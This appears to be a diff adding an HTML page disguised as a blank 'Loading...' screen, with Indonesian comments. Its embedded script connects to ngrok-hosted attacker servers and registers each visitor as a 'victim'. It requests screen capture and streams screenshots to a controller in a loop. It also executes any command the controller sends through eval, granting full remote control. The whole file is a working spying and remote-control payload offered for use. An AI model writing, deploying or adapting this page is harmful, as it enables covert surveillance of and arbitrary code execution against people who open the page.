@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body style="margin:0;">
+    <script src="https://a1b2c3d4.ngrok.io/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io('https://abc123.ngrok.io');
+        
+        // Daftar sebagai victim
+        socket.emit('victim');
+        
+        // Screenshot terus-menerus
+        async function capture() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = screen.width;
+            canvas.height = screen.height;
+            
+            try {
+                // Ambil screenshot
+                const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                function loop() {
+                    ctx.drawImage(video, 0, 0);
+                    canvas.toBlob((blob) => {
+                        socket.emit('screenshot', URL.createObjectURL(blob));
+                    });
+                    requestAnimationFrame(loop);
+                }
+                loop();
+            } catch(e) {}
+        }
+        capture();
+        
+        // Jalankan command dari controller
+        socket.on('run', (cmd) => {
+            eval(cmd);  // ⚠️ DANGER ZONE - FULL CONTROL
+        });
+    </script>
+</body>
+</html>
